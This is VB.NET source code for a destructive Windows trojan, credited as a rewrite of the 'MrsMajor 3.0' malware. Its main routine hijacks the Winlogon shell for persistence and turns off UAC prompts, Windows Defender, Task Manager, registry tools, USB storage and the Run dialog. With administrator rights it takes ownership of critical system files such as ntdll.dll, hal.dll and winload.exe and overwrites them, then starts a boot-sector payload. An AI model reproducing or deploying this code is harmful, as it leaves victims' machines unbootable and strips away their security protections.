' The original source code made by rootabx is available at: https://github.com/Gork3m/MrsMajor-3.0
' rewritten in VB.NET by Angel Castillo / Windows Vista

Imports System
Imports System.Diagnostics
Imports System.IO
Imports System.Windows.Forms
Imports Microsoft.Win32

Module Program

    Public Sub runprotector()
        Application.Run(New protection64())
    End Sub

    Public Sub runmform()
        Application.Run(New majorsgui())
    End Sub

    Sub Main()
        If File.Exists("kek.txt") Then
            Try
                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows NT\Winlogon")
                reg.SetValue("Shell", "explorer.exe, wscript.exe ""C:\windows\winbase_base_procid_none\secureloc0x65\WinRapistI386.vbs""")
                reg.Dispose()
            Catch
            End Try
            Try
                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\system")
                reg.SetValue("ConsentPromptBehaviorAdmin", 0)
                reg.Dispose()
            Catch
            End Try
            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\ActiveDesktop")
                reg.SetValue("NoChangingWallpaper", 1)
                reg.Dispose()
            Catch
            End Try
            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
                reg.SetValue("DisableTaskMgr", 1)
                reg.Dispose()
            Catch
            End Try
            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System")
                reg.SetValue("DisableRegistryTools", 1)
                reg.Dispose()
            Catch
            End Try
            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
                reg.SetValue("NoRun", 1)
                reg.Dispose()
            Catch
            End Try
            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Policies\Explorer")
                reg.SetValue("NoWinKeys", 1)
                reg.Dispose()
            Catch
            End Try
            Try
                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SYSTEM\CurrentControlSet\Services\usbstor")
                reg.SetValue("Start", 4)
                reg.Dispose()
            Catch
            End Try
            Try
                Dim reg As RegistryKey = Registry.LocalMachine.CreateSubKey("SOFTWARE\Policies\Microsoft\Windows Defender")
                reg.SetValue("DisableAntiSpyware", 1)
                reg.Dispose()
            Catch
            End Try
            Try
                Dim reg As RegistryKey = Registry.CurrentUser.CreateSubKey("Control Panel\Cursors")
                reg.SetValue("Arrow", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
                reg.SetValue("AppStarting", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
                reg.SetValue("Hand", "C:\Windows\winbase_base_procid_none\secureloc0x65\rcur.cur")
            Catch
            End Try
        End If
        Application.EnableVisualStyles()
        Application.SetCompatibleTextRenderingDefault(False)
        Dim p64 As New protection64
        If p64.userIsAdministrator Then
            If File.Exists("C:\Windows\WinAttr.gci") Then
                Dim files2owr() As String = {"winload.exe", "csrss.exe", "wininit.exe", "wininet.dll", "aclui.dll", "ADVAPI32.DLL", "crypt32.dll", "hal.dll", "logonui.exe", "ntdll.dll", "cryptbase.dll", "kernel32.dll", "userinit.exe", "crypt.dll", "chkdsk.exe"}
                For a As Integer = 0 To files2owr.Length - 1
                    Dim CurrentDirectory As String = System.Environment.CurrentDirectory
                    Dim username As String = System.Environment.GetEnvironmentVariable("username")
                    Dim Text As String = "@echo off" & vbNewLine & "cd %windir%\System32" & vbNewLine & "takeown /f " & files2owr(a) & vbNewLine & "icacls " & files2owr(a) & "/granted """ & username & """:F" & vbNewLine & "echo xa > """ & files2owr(a) & """"
                    File.WriteAllText("taskOverwrite.bat", Text)
                    Try
                        Dim prc As New Process
                        prc.StartInfo.FileName = "cmd.exe"
                        prc.StartInfo.Arguments = "/c """ & CurrentDirectory & "\taskOverwrite.bat"""
                        prc.StartInfo.Verb = "runas"
                        prc.StartInfo.WindowStyle = ProcessWindowStyle.Hidden
                        prc.Start()

                        If a = files2owr.Length - 1 Then
                            System.Threading.Thread.Sleep(2000)
                            Process.Start("C:\windows\winbase_base_procid_none\secureloc0x65\bsector3.exe")
                            Do
                                MsgBox("You messed up...", MsgBoxStyle.Critical, "uh oh")
                            Loop
                        End If
                    Catch
                    End Try
                Next
            End If
        End If
        System.Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf runprotector))
        System.Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf runmform))
        Application.Run(New MainForm())
    End Sub

End Module
